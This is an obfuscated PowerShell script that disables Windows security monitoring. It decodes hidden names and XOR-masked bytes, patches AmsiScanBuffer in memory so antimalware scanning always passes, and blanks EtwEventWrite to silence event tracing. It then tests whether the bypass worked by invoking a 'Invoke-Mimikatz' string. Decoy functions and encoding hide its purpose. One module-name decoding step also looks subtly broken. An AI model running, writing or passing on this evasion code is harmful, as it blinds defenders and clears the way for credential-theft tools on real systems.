function Qr4 { 5-2 | Out-Null }
function Tm8 { 'ab'.Replace('a','') | Out-Null }
function Nv1 { 3,1,4 | Measure-Object | Out-Null }
function Hs($s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
function Jk($s) { -join ($s.ToCharArray()[($s.Length-1)..0]) }
function Pl($d,$k) { $o = New-Object byte[] $d.Length; for($i=0;$i-lt$d.Length;$i++){ $o[$i] = $d[$i] -bxor $k[$i % $k.Length] }; $o }
function Mn($d,$x,$y) { Pl (Pl $d $x) $y }
function Wg { $k32::GetModuleHandle( (Hs (Jk $p1)) ) }
function Rc($addr,$len,$prot) { $o=0; $nt::NtProtectVirtualMemory(-1,[ref]$addr,[ref]$len,$prot,[ref]$o) | Out-Null; $o }
function Bx {
    $mod = $k32::GetModuleHandle( (Hs $p2) )
    $ptr = $k32::GetProcAddress($mod, (Hs $p3) )
    if ($ptr -ne [IntPtr]::Zero) {
        $sz = 6
        $old = Rc $ptr $sz 0x40
        $buf = Mn $p4 $kx $ky
        [Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)
        Rc $ptr $sz $old | Out-Null
    }
}
function Cy {
    $base = Wg
    $ep = $k32::GetProcAddress($base, (Hs $p5) )
    if ($ep -ne [IntPtr]::Zero) {
        $sz = 1
        $old = Rc $ep $sz 0x40
        $one = [byte[]](0xC3)
        [Runtime.InteropServices.Marshal]::Copy($one, 0, $ep, 1)
        Rc $ep $sz $old | Out-Null
    }
}

$p1 = 'bGxkdG4uZGxs'
$p2 = 'YW1zaS5kbGw='
$p3 = 'QW1zaVNjYW5CdWZmZXI='
$p4 = [byte[]](0x9E,0x71,0x26,0x21,0xA6,0xE5)
$p5 = 'RXR3RXZlbnRXcml0ZQ=='
$kx = [byte[]](0x12,0x12)
$ky = [byte[]](0x34,0x34)
$z1 = 1234
$z2 = 'qw'
$z3 = 0
$k32 = Add-Type -Name C3 -Namespace C3 -PassThru -MemberDefinition @'
[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
'@
$nt = Add-Type -Name D4 -Namespace D4 -PassThru -MemberDefinition @'
[DllImport("ntdll")]public static extern int NtProtectVirtualMemory(IntPtr p,ref IntPtr a,ref uint s,uint n,out uint o);
'@

Qr4; Tm8; Nv1
Bx
Cy

$rs = try {
    $null = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLU1pbWlrYXR6'))).Invoke()
    'OFF/Bypassed'
} catch {
    if ($_.Exception.Message -like '*malicious*' -or $_.FullyQualifiedErrorId -like '*ScriptContainedMaliciousContent*') { 'ON/Running' } else { 'OFF/Bypassed' }
}
$rv = $rs -eq 'OFF/Bypassed'
[pscustomobject]@{ "AMSI Status" = $rs; "AMSI Value (amsiInitFailed)" = $rv } | Format-List